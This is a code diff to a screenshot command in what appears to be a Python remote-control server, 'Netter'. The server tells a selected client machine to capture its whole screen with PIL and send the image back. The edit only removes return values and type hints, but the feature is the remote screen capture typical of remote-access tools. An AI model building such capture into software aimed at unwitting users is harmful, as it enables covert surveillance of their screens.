@@ -18,13 +18,13 @@ class screenshotCommand(CommandBase):
     def execute(self, netServer: "NetterServer", *args) -> "NetterClient":
         if not args and not netServer.selectedClient:
             netServer.inputHandler.handle("help screenshot")  # Sends usage information of this command
-            return False
+            return
 
         client: "NetterClient" = netServer.selectedClient if netServer.selectedClient is not None else netServer.get(UUID=args[0])
 
         if client is None:
             netServer.console_log("Provided clinet does not exists.", level="ERROR")
-            return False
+            return
 
         client.socket_.send_(packetType=PacketType.COMMAND, data="screenshot")
         return client
@@ -35,7 +35,7 @@ class screenshotCommand(CommandBase):
 
         netServer.console_log(f"Screenshot saved as {client.username}T{time.time()}.jpeg", level="INFO")
 
-    def on_client_receive(self, serverHandler: "Connect") -> str | bytes:
+    def on_client_receive(self, serverHandler: "Connect"):
         from PIL import ImageGrab
 
         image = ImageGrab.grab().convert("RGB")
